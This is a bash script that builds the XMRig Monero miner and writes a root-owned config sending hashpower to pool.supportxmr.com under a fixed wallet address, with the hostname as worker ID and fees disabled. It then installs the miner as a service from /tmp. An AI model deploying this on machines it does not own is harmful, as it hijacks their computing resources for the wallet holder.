#!/bin/bash

apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev automake libtool autoconf -y

mkdir build 
cd build

cmake ..

make -j$(nproc)

echo "
{
    \"log-file\": null,
    \"donate-level\": 0,
    \"donate-over-proxy\": 0,
    \"pools\": [
        {
            \"algo\": null,
            \"coin\": null,
            \"url\": \"pool.supportxmr.com:443\",
            \"user\": \"44rVjbFMojMdgVW2xeL3bCDubfaE45QSe2YH2o1dz154XDeMLCXCtyuM9YAWtW1NCE7frTRk8GoAkatpA7Z3QCM1J8p61jt\",
            \"pass\": \"$(hostname)\",
            \"rig-id\": null,
            \"nicehash\": false,
            \"keepalive\": true,
            \"enabled\": true,
            \"tls\": true,
            \"sni\": false,
            \"tls-fingerprint\": null,
            \"daemon\": false,
            \"socks5\": null,
            \"self-select\": null,
            \"submit-to-origin\": false
        }
    ]
}
" > /root/config.json


cp xmrig /root/xmrig

chmod +x /tmp/xmrig-nofee/setup_service.sh

bash /tmp/xmrig-nofee/setup_service.sh
